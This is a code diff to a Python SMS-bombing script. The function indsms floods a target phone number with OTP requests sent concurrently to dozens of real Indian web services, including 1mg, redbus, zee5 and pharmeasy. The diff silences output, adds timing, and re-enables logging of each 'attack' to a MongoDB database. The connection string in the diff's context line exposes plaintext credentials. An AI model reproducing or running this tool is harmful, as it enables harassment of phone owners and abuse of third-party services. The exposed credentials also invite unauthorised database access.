@@ -9,6 +9,7 @@ conp = MongoClient("mongodb+srv://thejatin:jatinkalwar@attacknum.nmuaiq8.mongodb
 
 
 async def indsms(tarnum: int , skey):
+    start = time.time()
     async def whitehat(tarnum: int):
         try:
 
@@ -49,7 +50,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
 
             return "done"
         except Exception as e:
@@ -75,7 +76,7 @@ async def indsms(tarnum: int , skey):
                         params=params,
                         json=json_data,
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -112,7 +113,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.apollo247.com/', headers=headers, json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -127,7 +128,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post('https://www.1mg.com/auth_api/v6/create_token', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -141,7 +142,7 @@ async def indsms(tarnum: int , skey):
                         f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
                         json=json_data,
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -156,7 +157,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post('https://api.tendercuts.in/otp/v2/generate/', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -189,7 +190,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -203,7 +204,7 @@ async def indsms(tarnum: int , skey):
                         'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
                         data=data,
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -220,7 +221,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api-apollo.dentalkart.com/graphql', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -257,7 +258,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -270,7 +271,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.decathlon.in/api/login/sendotp', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -303,7 +304,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.trainman.in/services/user/signup', params=params, headers=headers,
                                      data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -317,7 +318,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post('https://www.redbus.in/help/api/cx/generateOtp', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -329,7 +330,7 @@ async def indsms(tarnum: int , skey):
                 async with sess.get(
                         f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true'
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -347,7 +348,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -361,7 +362,7 @@ async def indsms(tarnum: int , skey):
 
                 async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone',
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -378,7 +379,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post('https://user.vedantu.com/user/preLoginVerification', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -406,7 +407,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers,
                                      data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -437,7 +438,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -449,7 +450,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://bbapi.ballebaazi.com/users/applink', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -464,7 +465,7 @@ async def indsms(tarnum: int , skey):
 
                 async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp',
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -514,7 +515,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -526,7 +527,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://customer.rapido.bike/api/otp', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -556,7 +557,7 @@ async def indsms(tarnum: int , skey):
 
                 async with sess.post('https://api.gopaysense.com/users/otp', headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -575,7 +576,7 @@ async def indsms(tarnum: int , skey):
 
                 async with sess.post('https://www.medibuddy.in/unified-login/user/register',
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -592,7 +593,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.get('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -605,7 +606,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.xtracover.com/MyAccount/GetOtpByMobileNo', data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -629,7 +630,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.myg.in/index.php', params=params, data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -675,7 +676,7 @@ async def indsms(tarnum: int , skey):
                         headers=headers,
                         data=data,
                 ) as response:
-                    print()
+                    pass
                 return "done"
         except Exception as e:
             return "failed"
@@ -689,7 +690,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://tyresnmore.com/otplogin/account/otploginpost/', data=data) as response:
-                    print()
+                    pass
 
                 return "done"
         except Exception as e:
@@ -706,7 +707,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.winni.in/customer/verify-email', data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -753,7 +754,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers,
                                      data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -781,7 +782,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://admin.moha.co.in/graphql', headers=headers, json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -795,7 +796,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.spinny.com/api/c/user/otp-request/', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -808,7 +809,7 @@ async def indsms(tarnum: int , skey):
                         'https://www.carandbike.com/api/user/register/submit-lead-form',
                         data=data,
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -848,7 +849,7 @@ async def indsms(tarnum: int , skey):
                         headers=headers,
                         json=json_data,
                 ) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -887,7 +888,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.tradeindia.com/home/registration/', cookies=cookies, headers=headers,
                                      data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -902,7 +903,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.mobex.in/graphql', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -916,7 +917,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.onebharatpharmacy.com/login/send_custom_otp', data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -933,7 +934,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://app.medkart.in/api/v1/auth/requestOTP', params=params,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -949,7 +950,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://crm.frankrosspharmacy.com/api/v8/user/otp_signin',
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -964,7 +965,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://api.mamaearth.in/v1/auth/initiateSignup', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1039,7 +1040,7 @@ async def indsms(tarnum: int , skey):
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.caratlane.com/cg/dhevudu', cookies=cookies, headers=headers,
                                      json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1051,7 +1052,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://hometriangle.com/api/self/xauth/login/otp', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1082,7 +1083,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://droom.in/send-onboard-otp', headers=headers, data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1094,7 +1095,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://pharmeasy.in/apt-api/login/send-otp', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1109,7 +1110,7 @@ async def indsms(tarnum: int , skey):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.biomall.in/triggerOtp', data=data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
@@ -1148,18 +1149,17 @@ async def indsms(tarnum: int , skey):
             ]
             async with aiohttp.ClientSession() as sess:
                 async with sess.post('https://www.mfine.co/consult/proxy/firehose', json=json_data) as response:
-                    print()
+                    pass
             return "done"
         except Exception as e:
             return "failed"
 
     async def entry(tarnum , skey):
-        try:
-            conp.attack.attacknum.insert_one(
-                {"key": skey, "on": tarnum, "type": "sms", "count": "india", "when": str(datetime.now())})
-            return "ok"
-        except Exception as e:
-            return e
+        ko = conp.attack.attacknum.insert_one({"key": skey, "on": tarnum, "type": "sms", "count": "india", "when": str(datetime.now())})
+        print(ko)
+        end = time.time()
+        print(end - start)
+        return "ok"
 
     async def main(tarnum , skey):
         for i in range(2):
@@ -1211,8 +1211,8 @@ async def indsms(tarnum: int , skey):
                 pharmaeasy(tarnum),
                 mfine(tarnum),
                 biomall(tarnum)
-
             )
-        #await entry(tarnum , skey)
+            print(jh)
+        await entry(tarnum , skey)
     return await main(tarnum , skey)
 
